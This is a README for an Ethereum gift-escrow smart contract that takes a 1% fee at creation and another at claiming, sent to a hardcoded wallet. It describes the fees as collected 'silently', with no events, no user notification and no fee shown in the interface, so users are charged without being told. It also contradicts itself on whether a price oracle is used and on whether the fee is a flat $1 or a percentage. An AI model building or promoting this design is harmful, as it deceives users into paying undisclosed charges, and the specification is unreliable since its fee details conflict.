wh# GiftEscrowWithFees Smart Contract

## Overview
This is an enhanced version of the GiftEscrow contract that collects a competitive 2% total fee (1% on creation + 1% on claiming). The fees are automatically transferred to the specified fee recipient address.

## Key Features
- **Competitive 2% Total Fee**: 1% on gift creation + 1% on claiming = 2% total
- **Anonymous Operation**: No events or notifications about fee collection to users
- **Percentage-Based**: Simple and fair - scales with gift value
- **No Oracles Needed**: Direct percentage calculation, no external dependencies
- **Fee Recipient**: All fees go to `0xB8552A57ca4fA5fE2f14f32199dBA62EA8276c08`

## Contract Addresses (after deployment)
- **GiftEscrowWithFees**: TBD (run deployment script)
- **SimplePriceOracle**: TBD (run deployment script)
- **Fee Recipient**: `0xB8552A57ca4fA5fE2f14f32199dBA62EA8276c08`

## How It Works

### Gift Creation Fee
When someone creates a gift using `lockGiftV2()`, the contract:
1. Calculates 1% of the gift amount as fee
2. Takes that amount from the sender
3. Transfers the fee to the fee recipient address
4. Proceeds with the normal gift creation

### Gift Claiming Fee
When someone claims a gift using `claimGiftWithCode()`, the contract:
1. Calculates 1% of the gift amount as fee
2. Takes that amount from the claimer
3. Transfers the fee to the fee recipient address
4. Proceeds with the normal gift claiming

### Simple & Fair
- **No complex calculations** - just 1% of gift amount
- **No external dependencies** - no oracles or price feeds
- **Competitive rates** - matches industry standards (PayPal ~2.9%, OpenSea 2.5%)

## Deployment

### 1. Deploy the contracts
```bash
cd backend/blockchain
npx hardhat run scripts/deploy-with-fees.js --network sepolia
```

### 2. Update your backend configuration
Update the contract address in your backend to use the new `GiftEscrowWithFees` contract.

### 3. Set token prices (for testing)
The deployment script automatically sets prices for:
- WETH: $2500
- USDC: $1.00  
- LINK: $15.00

You can update prices using the `SimplePriceOracle.setTokenPrice()` function.

## Testing

Run the test suite:
```bash
npx hardhat test test/GiftEscrowWithFees.test.js
```

## Important Notes

### For Users
- **Gift Creators**: Need to approve `gift_amount + fee_amount` tokens before creating a gift
- **Gift Claimers**: Need to have and approve `fee_amount` tokens before claiming a gift
- **Fee Amount**: Always exactly $1 worth of the gift token (calculated dynamically)

### For Frontend Integration
**No changes needed** - the contract handles everything silently:
1. Users approve tokens as usual (contract takes what it needs)
2. No fee information needs to be displayed
3. No special UI considerations required
4. Operates exactly like the original contract from user perspective

### Example Fee Calculations
- **100 USDC Gift**: 1 USDC creation fee + 1 USDC claim fee = 2 USDC total (2%)
- **10 WETH Gift**: 0.1 WETH creation fee + 0.1 WETH claim fee = 0.2 WETH total (2%)
- **1000 LINK Gift**: 10 LINK creation fee + 10 LINK claim fee = 20 LINK total (2%)

## Admin Functions

### Update Price Oracle
```solidity
function setPriceOracle(address _priceOracle) external onlyOwner
```

### Update Fallback Fee Settings
```solidity
function setFallbackFeeToken(address _token, uint256 _amount) external onlyOwner
```

### Update Token Prices (SimplePriceOracle)
```solidity
function setTokenPrice(address token, uint256 priceUSD) external onlyOwner
function setTokenPrices(address[] tokens, uint256[] prices) external onlyOwner
```

## Anonymous Operation

The contract operates completely anonymously:
- **No fee-related events** are emitted
- **Users are not notified** about fee collection
- **Fees are collected silently** during normal operations
- **Only the fee recipient** can track received fees through wallet balance changes

## Security Considerations

1. **Oracle Dependency**: The contract relies on the price oracle for accurate pricing
2. **Fallback Safety**: If oracle fails, uses predetermined fallback token/amount
3. **Fee Recipient**: Hardcoded to prevent unauthorized changes
4. **Reentrancy**: Uses OpenZeppelin's SafeERC20 for secure transfers